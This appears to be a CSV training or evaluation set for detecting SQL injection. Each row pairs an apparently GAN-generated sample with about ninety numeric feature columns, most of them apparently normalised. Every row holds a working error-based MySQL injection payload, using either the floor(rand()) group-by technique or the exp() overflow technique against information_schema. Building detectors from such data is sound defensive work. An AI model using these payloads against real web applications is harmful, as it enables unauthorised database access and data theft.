id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000011,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.249928476092866,272.6189880371094,80.4309310913086,40.4096794128418,105.56941223144531,-0.7363119125366211,84.08784484863281,38.636173248291016,0.8344900012016296,0.284722238779068,0.16409775614738464,0.3906659185886383,0.12439321726560593,3.7945663928985596,1.5042933225631714,1.055506706237793,0.5616480708122253,0.14347046613693237,0.12610942125320435,0.1142105758190155,9.73281192779541,9.531813621520996,4.171379089355469,-0.04474271833896637,1.6729215383529663,0.3152798116207123,-0.05352555587887764,-0.06559643149375916,0.18570227921009064,1.232557773590088,-0.03870623931288719,-0.26786819100379944,2.080209970474243,0.11926212906837463,0.32967036962509155,2.0698306560516357,7.858042240142822,1.0738320350646973,3.111262321472168,0.3869664669036865,0.44008198380470276,0.9700284004211426,-0.055480726063251495,0.02355368062853813,0.08451539278030396,-0.22882111370563507,0.05293913185596466,0.2954656183719635,0.395007461309433,0.49094295501708984,0.1112678125500679,0.20445089042186737,0.1581079661846161,0.028754204511642456,0.373091459274292,0.06804516911506653,0.1286192387342453,0.024919457733631134,0.09436838328838348,0.23293524980545044,-0.12096960097551346,-0.05536944419145584,0.021397791802883148,0.08002889901399612,0.058050550520420074,-0.03124328702688217,0.7071537971496582,0.20393571257591248,0.17696204781532288,0.16950006783008575,-0.221049964427948,-0.10200417786836624,0.16838346421718597,0.10289349406957626,0.03125244751572609,-0.17879311740398407,1.364330530166626,0.3875266909599304,-0.18816784024238586,0.033301837742328644,0.5384446978569031,9.205493927001953,0.926530122756958,0.31955111026763916,0.014260536059737206,0.7823411226272583,0.22565671801567078,0.08089865744113922,0.1481776237487793
GAN_000012,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.4943658406048606,288.6651916503906,75.45243835449219,41.937713623046875,105.58151245117188,-2.239682674407959,87.93997192382812,40.96221160888672,1.0863107442855835,0.26614660024642944,0.15675395727157593,0.3961368203163147,0.12642443180084229,3.742921829223633,1.5383870601654053,1.6390483379364014,0.7361314296722412,0.19992755353450775,-0.043856728821992874,0.10752823948860168,10.581086158752441,9.283672332763672,3.806290626525879,-0.005119413137435913,1.7130118608474731,0.38687053322792053,0.17245329916477203,-0.16105827689170837,0.2078143209218979,1.3808313608169556,-0.12893541157245636,-0.13524489104747772,1.8681319952011108,0.26304730772972107,0.24583032727241516,2.1820530891418457,7.582734107971191,0.7372533679008484,3.395174503326416,0.458722323179245,0.5529088377952576,1.1576859951019287,0.07949734479188919,0.01122131198644638,0.41499063372612,-0.33997344970703125,-0.26888662576675415,0.45067909359931946,0.29678282141685486,0.5291248559951782,0.05645095184445381,0.34588733315467834,-0.07094727456569672,0.3203315734863281,0.40349698066711426,0.03727126866579056,0.11376875638961792,0.15216824412345886,0.15432052314281464,0.026555970311164856,0.01164218783378601,0.040433868765830994,-0.3043074309825897,-0.03129927068948746,0.10473085939884186,-0.056209731847047806,0.7145692110061646,0.4207213222980499,0.18338821828365326,0.1951461136341095,-0.3381762206554413,-0.2367314249277115,-0.0588049553334713,0.1883305013179779,0.05640726536512375,0.07625965774059296,1.293121099472046,0.16703660786151886,-0.26717111468315125,-0.04116678237915039,0.5562739372253418,9.278520584106445,0.95956951379776,0.3688020408153534,-0.0625554546713829,0.7575937509536743,0.08614711463451385,0.25515347719192505,-0.002039693295955658
GAN_000013,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000255,5.188676726707803,268.88421630859375,78.0312728881836,41.1942138671875,102.06982421875,1.6438884735107422,82.14424896240234,36.19536209106445,1.087618350982666,0.30696114897727966,0.16377834975719452,0.39711883664131165,0.1250806301832199,3.7843947410583496,1.1579699516296387,0.9007152915000916,0.5171025395393372,0.15748053789138794,-0.05581096559762955,0.0869458019733429,9.614110946655273,9.595430374145508,3.8791096210479736,0.07358135282993317,1.8134281635284424,0.28689610958099365,-0.02496327832341194,0.19562560319900513,0.1432325392961502,0.9949051141738892,0.03722994774580002,-0.13806939125061035,1.978204369544983,-0.0551743246614933,0.2666916251182556,2.1714985370635986,7.881811141967773,1.1199226379394531,3.0462722778320312,0.6107686161994934,0.3389723598957062,0.960304856300354,0.046577341854572296,0.028371017426252365,0.07879661023616791,-0.18562014400959015,-0.17170877754688263,0.37635916471481323,0.31194576621055603,0.368806928396225,0.22386707365512848,0.2035195678472519,-0.1468980610370636,0.09910502284765244,0.452104389667511,0.08163750171661377,0.13723383843898773,0.09098247438669205,-0.07033473253250122,0.14519542455673218,-0.014762766659259796,-0.08783051371574402,-0.10607276111841202,0.10243197530508041,0.10029711574316025,-0.030228037387132645,0.7823044657707214,0.08811479806900024,0.045186664909124374,0.03421106934547424,0.11211982369422913,-0.09479403495788574,0.05163664370775223,-0.03802800178527832,0.03346183896064758,0.04545993357896805,1.120333194732666,0.4392125606536865,-0.0040226951241493225,0.13993389904499054,0.4860402047634125,9.519516944885254,0.7553013563156128,0.2974012494087219,0.017496764659881592,0.7539202570915222,-0.0568467415869236,-0.148574098944664,-0.13355255126953125
GAN_000014,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.147851171797725,272.8495178222656,78.70830535888672,41.830787658691406,104.55940246582031,0.7060043811798096,83.96560668945312,39.097007751464844,1.1020959615707397,0.28257665038108826,0.15994909405708313,0.39379507303237915,0.12495239824056625,3.7465381622314453,1.4280610084533691,1.1978193521499634,0.7116798162460327,0.18002377450466156,0.06459012627601624,0.02545241452753544,9.79689884185791,9.504109382629395,3.8394412994384766,0.0879899188876152,1.7011054754257202,0.3254881799221039,0.11080171167850494,0.03115716576576233,0.19487890601158142,1.2625696659088135,-0.018318701535463333,-0.07034431397914886,1.9447503089904785,0.21062184870243073,0.3002264201641083,2.1549911499023438,7.732962608337402,0.8063710927963257,2.975417137145996,0.41199490427970886,0.47626999020576477,1.0373605489730835,0.06744467467069626,0.01019446924328804,0.17572733759880066,-0.2044607251882553,-0.1561942845582962,0.31093403697013855,0.33521121740341187,0.42604854702949524,0.03489189222455025,0.267853319644928,-0.010854214429855347,0.20606926083564758,0.4081134796142578,0.06660764664411545,0.15786923468112946,0.15251082181930542,0.03891433775424957,0.04002479463815689,-0.017472952604293823,-0.012833531945943832,-0.10711146146059036,0.02263939380645752,0.08500323444604874,-0.022846482694149017,0.772117555141449,0.15280726552009583,0.10432137548923492,0.1152057945728302,-0.18926551938056946,-0.20224671065807343,-0.05464501306414604,0.21532991528511047,0.026784755289554596,0.044269394129514694,1.342735767364502,0.26833274960517883,-0.14065197110176086,0.027371428906917572,0.4550500512123108,9.489877700805664,0.819826602935791,0.2929738759994507,-0.022760240361094475,0.7518119215965271,0.06338284909725189,0.16281066834926605,-0.09674020856618881
GAN_000015,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.196482991866171,272.38897705078125,77.95488739013672,41.6037483215332,105.02912902832031,0.34254980087280273,86.12609100341797,38.92626953125,1.1724693775177002,0.2724429666996002,0.16397705674171448,0.38648927211761475,0.12619486451148987,3.760249614715576,1.5421794652938843,0.9157443642616272,0.5557678937911987,0.15153789520263672,-0.049130648374557495,0.2765370011329651,9.470236778259277,9.645323753356934,4.139137268066406,-0.057013511657714844,1.6848177909851074,0.28042399883270264,-0.21296219527721405,0.0515749454498291,0.08160039782524109,1.1716887950897217,-0.04974484071135521,-0.015328675508499146,1.9547269344329834,0.3389342427253723,0.37484389543533325,2.034531831741333,7.703657150268555,0.6916301250457764,2.7648472785949707,0.5308921337127686,0.3874613344669342,1.1721489429473877,-0.17088797688484192,-0.018392259255051613,0.019717000424861908,-0.013078853487968445,-0.21621501445770264,0.3159746825695038,0.34992358088493347,0.3761392831802368,0.02216111496090889,0.25432536005973816,-0.07477422058582306,0.044020190834999084,0.44314202666282654,0.05456648766994476,0.07383442670106888,0.13308635354042053,0.22387029230594635,-0.011313825845718384,-0.13900402188301086,0.25213706493377686,0.02654396742582321,0.08229709416627884,0.0601329430937767,-0.1389167606830597,0.7408804893493652,0.14012615382671356,0.28254032135009766,0.035247817635536194,-0.14450766146183014,-0.11987940222024918,0.05936354398727417,0.3111007511615753,0.02219742350280285,0.003120139241218567,1.3464808464050293,0.28744032979011536,-0.22078052163124084,-0.030345842242240906,0.5095259547233582,9.424161911010742,0.9088921546936035,0.3829714059829712,-0.041853759437799454,0.6782407164573669,-0.0080634206533432,0.37577173113822937,-0.1337207555770874
GAN_000016,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000255,5.2016701842587585,270.54510498046875,74.92630004882812,41.09447479248047,100.3604736328125,3.137690305709839,86.9774398803711,37.56879425048828,0.978721022605896,0.2896466553211212,0.16117626428604126,0.38736921548843384,0.12479828298091888,3.7659122943878174,1.091590404510498,0.769354522228241,0.5014721751213074,0.12565726041793823,-0.18025918304920197,-0.0187445767223835,9.522153854370117,9.659490585327148,3.480985403060913,0.12844735383987427,1.812612771987915,0.30180126428604126,-0.043495334684848785,0.24269701540470123,0.12038937211036682,1.0348187685012817,-0.04973796382546425,-0.14822860062122345,1.9895834922790527,-0.0086500383913517,0.25892671942710876,2.238971471786499,7.872324466705322,1.0479736328125,2.7764127254486084,0.4838663935661316,0.41016969084739685,1.0715487003326416,0.1309089958667755,0.004200676456093788,0.25453898310661316,-0.10540470480918884,-0.1074463501572609,0.34010687470436096,0.3122940957546234,0.35379865765571594,0.17461691796779633,0.24821653962135315,-0.14656582474708557,0.17711693048477173,0.49863043427467346,0.06187036260962486,0.09563687443733215,0.11193744093179703,-0.061127081513404846,0.2741265296936035,0.0030179768800735474,-0.10089816898107529,-0.13289010524749756,0.16112148761749268,0.10714954882860184,0.06856605410575867,0.7730892896652222,0.0056944191455841064,0.049040086567401886,-0.046083301305770874,0.02835485339164734,-0.16765354573726654,0.0025451555848121643,-0.06707078218460083,0.013809455558657646,0.11969642341136932,1.1610358953475952,0.3587033450603485,-0.13537508249282837,0.14088085293769836,0.5200870037078857,9.714210510253906,0.7717222571372986,0.3499310612678528,0.013898175209760666,0.6786149144172668,-0.17280444502830505,-0.1646435558795929,-0.0015540793538093567
GAN_000017,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.307825242517668,274.19976806640625,81.05660247802734,41.25763702392578,99.9005126953125,-2.3343234062194824,80.71310424804688,38.76176452636719,1.3201119899749756,0.29126277565956116,0.16831964254379272,0.39591237902641296,0.1248311921954155,3.7484898567199707,1.383848786354065,1.0682260990142822,0.6194230914115906,0.1558324545621872,-0.015762008726596832,0.07110599428415298,10.24459457397461,9.315942764282227,4.016089916229248,-0.12780773639678955,1.7062679529190063,0.2689756155014038,0.08221673965454102,0.061373814940452576,0.07917547971010208,1.1240707635879517,-0.08217690885066986,-0.06607265770435333,1.9694057703018188,0.0644555389881134,0.3583602011203766,2.2206175327301025,8.053418159484863,1.056632399559021,3.2407495975494385,0.6044607758522034,0.38993027806282043,0.9126139283180237,-0.05272049456834793,0.004505785182118416,0.017429664731025696,-0.16313935816287994,-0.13115447759628296,0.34327033162117004,0.3665752708911896,0.37552323937416077,0.01774563267827034,0.15325474739074707,-0.13385966420173645,0.11527938395738602,0.4276021122932434,0.03847133740782738,0.1525733321905136,0.04408428072929382,0.025978192687034607,0.29362037777900696,-0.10692916810512543,-0.13776381313800812,-0.17945879697799683,0.18976005911827087,0.10794855654239655,-0.057999882847070694,0.863071084022522,-0.007805638015270233,0.0592866949737072,0.03738042712211609,0.13822615146636963,-0.1304754763841629,0.15391568839550018,0.09045058488845825,0.05400314927101135,-0.11034691333770752,1.2243071794509888,0.4796558618545532,-0.21888059377670288,0.07388413697481155,0.47692540287971497,9.050033569335938,0.8476298451423645,0.3523004949092865,0.015016401186585426,0.7921143770217896,0.10590750724077225,-0.13827554881572723,-0.11018544435501099
GAN_000018,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.435532090703819,273.7480163574219,77.28089904785156,39.038116455078125,96.29923248291016,1.1678411960601807,88.6521224975586,40.360809326171875,0.9662035703659058,0.2775307893753052,0.16314277052879333,0.38566088676452637,0.12563718855381012,3.735985040664673,0.9576382637023926,0.8032028675079346,0.4511836767196655,0.12591029703617096,-0.1338922679424286,0.12120014429092407,10.031719207763672,9.003708839416504,3.3145956993103027,0.0710478350520134,1.6686855554580688,0.3274431526660919,0.01631901040673256,0.12129554152488708,0.07374356687068939,1.0285489559173584,-0.14443917572498322,-0.16713109612464905,1.8720439672470093,0.05571158602833748,0.26782718300819397,2.3103177547454834,8.092143058776855,0.9642910957336426,3.0330312252044678,0.5119103193283081,0.4587933123111725,1.200443148612976,0.059238191694021225,-0.021579785272479057,0.3755703568458557,-0.2632021903991699,-0.1262044459581375,0.392856240272522,0.2897796332836151,0.3895563781261444,0.11681871861219406,0.17748765647411346,-0.29909375309944153,0.2862626910209656,0.5225968956947327,-0.0046019949950277805,0.06637583673000336,0.12606394290924072,0.008856363594532013,0.5602558851242065,-0.01672632247209549,-0.1128225103020668,-0.3229711651802063,0.27866798639297485,0.16662777960300446,0.11776814609766006,0.7589983940124512,0.10680781304836273,0.0842788890004158,-0.1919156014919281,0.05294622853398323,-0.2673869729042053,0.041460417211055756,-0.07725583016872406,0.03282441198825836,0.042344920337200165,1.1876626014709473,0.260075181722641,-0.2344444990158081,0.10254520922899246,0.5435512065887451,9.45129108428955,0.8953197598457336,0.41259464621543884,-0.01223897747695446,0.7722243070602417,-0.0286264568567276,-0.20360831916332245,-0.027449876070022583
GAN_000019,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.392206080884868,274.31854248046875,72.79974365234375,41.35926055908203,104.29161834716797,-2.1280579566955566,89.64060974121094,38.798484802246094,0.8345766067504883,0.2827739715576172,0.16097794473171234,0.3881136476993561,0.1277678906917572,3.790482521057129,1.399518609046936,0.9199889302253723,0.45477792620658875,0.1295730173587799,-0.020922521129250526,0.25467604398727417,9.821842193603516,9.560112953186035,4.024069309234619,-0.018125995993614197,1.6573959589004517,0.30988311767578125,-0.0781974047422409,-0.03717660903930664,0.17277972400188446,1.2386138439178467,-0.05653122439980507,-0.3714596629142761,1.967928409576416,0.1648513376712799,0.2528533637523651,2.129279136657715,7.967500686645508,0.9586752653121948,3.034471273422241,0.4447140097618103,0.45913803577423096,1.090141773223877,-0.024818606674671173,-0.0008724983199499547,0.31999507546424866,-0.22718240320682526,-0.07019121944904327,0.40726056694984436,0.3965781629085541,0.4881935715675354,0.17864082753658295,0.1724298894405365,0.011873677372932434,0.02162151038646698,0.3931862711906433,0.03133837506175041,0.08115270733833313,0.1494016945362091,-0.0716981440782547,0.3843785226345062,-0.11082713305950165,0.03198632597923279,-0.15897539258003235,0.02231079339981079,0.0967043861746788,0.14030253887176514,0.6361070871353149,0.34032168984413147,0.1706279218196869,0.053026944398880005,-0.2812272906303406,-0.1817590296268463,0.16119572520256042,-0.007901430130004883,0.03892531245946884,-0.09274134039878845,1.2668334245681763,0.2474709153175354,-0.21315622329711914,0.10829570144414902,0.5062536597251892,9.208239555358887,0.9813635349273682,0.3819825351238251,-0.04136662557721138,0.7213032245635986,0.099613256752491,0.048414524644613266,0.043457478284835815
GAN_000020,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.41474161439121,273.9978332519531,76.80158233642578,39.87120056152344,103.2755355834961,-0.8525295257568359,88.8101806640625,41.12923812866211,0.8058111667633057,0.2691303491592407,0.1616494506597519,0.3904622495174408,0.12481226027011871,3.7953906059265137,1.3550822734832764,1.2023943662643433,0.5331477522850037,0.15818096697330475,0.1652659773826599,0.13798515498638153,10.214394569396973,9.669561386108398,3.9236857891082764,-0.04347515106201172,1.635453224182129,0.39607957005500793,-0.04579242318868637,-0.14972785115242004,0.2049289494752884,1.4157905578613281,-0.1446169912815094,-0.24879807233810425,1.8920625448226929,0.11931125819683075,0.3399062156677246,2.163015604019165,8.104976654052734,0.8559949398040771,3.21565318107605,0.2600993812084198,0.5601336359977722,1.1600035429000854,-0.05170346051454544,-0.003516828641295433,0.24148252606391907,-0.23044346272945404,-0.012070424854755402,0.3682364523410797,0.4562855660915375,0.5587647557258606,0.024083632975816727,0.1727360188961029,0.14931723475456238,0.20992428064346313,0.4373915493488312,0.041572894901037216,0.040472354739904404,0.05539935082197189,0.1560397893190384,0.23950937390327454,0.05483738332986832,0.020335927605628967,-0.19212689995765686,0.0902082696557045,0.07072661072015762,-0.08372677862644196,0.6449137926101685,0.40259698033332825,0.22435316443443298,0.13613858819007874,-0.42041829228401184,-0.16179513931274414,0.2003411501646042,0.1812244951725006,0.023028604686260223,-0.24577972292900085,1.4800405502319336,0.23061642050743103,-0.31348931789398193,-0.031353145837783813,0.5460464954376221,9.2620849609375,1.0102225542068481,0.3372744917869568,-0.018417900428175926,0.7750028371810913,0.248260498046875,0.2833857834339142,0.143527090549469
GAN_000021,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.414299670451001,270.3062438964844,73.92674255371094,40.48988342285156,103.66889190673828,-0.4086918830871582,91.67459869384766,42.31486129760742,0.7215455770492554,0.26218581199645996,0.16525092720985413,0.3889789581298828,0.12421360611915588,3.7788867950439453,1.3861474990844727,1.0628448724746704,0.5212641954421997,0.1886775642633438,0.016017554327845573,0.14241915941238403,10.225976943969727,9.781319618225098,3.9604249000549316,-0.03939816355705261,1.62236487865448,0.4112149775028229,-0.10145492106676102,-0.10871905088424683,0.1993010938167572,1.4031296968460083,-0.1940324753522873,-0.3163958787918091,2.0308287143707275,0.11820554733276367,0.3147593140602112,2.263627767562866,8.25300121307373,0.8795074224472046,3.191936731338501,0.20776373147964478,0.5854411125183105,1.159895658493042,-0.0011181384325027466,-0.0019939448684453964,0.40452656149864197,-0.22711236774921417,0.10575485229492188,0.3382249176502228,0.4550113081932068,0.5742427110671997,-0.004977833013981581,0.12968656420707703,0.2812383770942688,0.11448723822832108,0.4138323664665222,0.03855980187654495,0.08197073638439178,0.08440058678388596,0.07865025103092194,0.27020934224128723,0.03979923576116562,-0.06929521262645721,-0.13932156562805176,0.11886907368898392,0.07387279719114304,-0.01883392408490181,0.6626763939857483,0.2465154528617859,0.21802443265914917,0.08473405241966248,-0.4884423315525055,-0.1705007553100586,0.16501730680465698,0.16248705983161926,0.021510303020477295,-0.21658864617347717,1.582301378250122,0.2408515214920044,-0.34829145669937134,0.027826525270938873,0.5696113705635071,9.577996253967285,0.9973189830780029,0.3625248968601227,-0.023984694853425026,0.730040431022644,0.22660347819328308,0.21503779292106628,0.23566904664039612
